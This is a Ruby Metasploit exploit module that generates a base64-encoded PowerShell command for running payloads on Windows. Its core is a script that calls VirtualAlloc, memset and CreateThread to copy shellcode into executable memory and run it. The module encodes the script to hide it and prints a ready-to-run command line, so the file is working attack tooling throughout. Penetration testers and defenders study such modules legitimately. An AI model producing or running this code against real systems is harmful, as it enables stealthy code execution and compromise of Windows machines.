require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking
	
	include Msf::Auxiliary::Report
	
	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Generate PowerShell CMD Payload',
			'Description'    => %q{This module generates a base64 encoded MSF 
								   payload that can be executed with PowerShell.},
			'Author'         =>
				[
					'Scott Sutherland "nullbind" <scott.sutherland [at] netspi.com>'
				],
			'Platform'      => [ 'win' ],
			'License'        => MSF_LICENSE,
			'References'     => [['URL','http://www.exploit-monday.com/2011_10_16_archive.html']],
			'Platform'       => 'win',
			'DisclosureDate' => 'Jan 1 2000',
			'Targets'        =>
				[
					[ 'Automatic', { } ],
				],
			'DefaultTarget'  => 0
		))

		register_options(
			[
				OptBool.new('VERBOSE',  [false, 'Set how verbose the output should be', 'false']),
			], self.class)
	end

	def exploit
		
		# Create powershell script that will inject shell code from the selected payload
		myscript ="$code = @\"
[DllImport(\"kernel32.dll\")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport(\"kernel32.dll\")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport(\"msvcrt.dll\")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);
\"@
$winFunc = Add-Type -memberDefinition $code -Name \"Win32\" -namespace Win32Functions -passthru
[Byte[]]$sc =#{Rex::Text.to_hex(payload.encoded).gsub('\\',',0').sub(',','')}
$size = 0x1000
if ($sc.Length -gt 0x1000) {$size = $sc.Length}
$x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40)
for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)}
$winFunc::CreateThread(0,0,$x,0,0,0)"

		# Unicode encode powershell script
		mytext_uni = Rex::Text.to_unicode(myscript)

		# Base64 encode unicode
		mytext_64 = Rex::Text.encode_base64(mytext_uni)		
		
		# Display outputb
		print_status("Generating powershell command...\n")
		ps_cmd = "powershell.exe -noexit -noprofile -encodedCommand #{mytext_64}"
		puts "powershell.exe -noexit -noprofile -encodedCommand #{mytext_64}"
		print_status("\n")
			
		# Write log to loot / file
		filename= "ps_cmd.csv"
		path = store_loot("ps_cmd", "text/plain", "", ps_cmd, filename, "","MSSQL")
		print_status("PowerShell command exported to: #{path}")		
		print_status("NOTE: On 64 bit systems execute from C:\\windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe")
	end
end
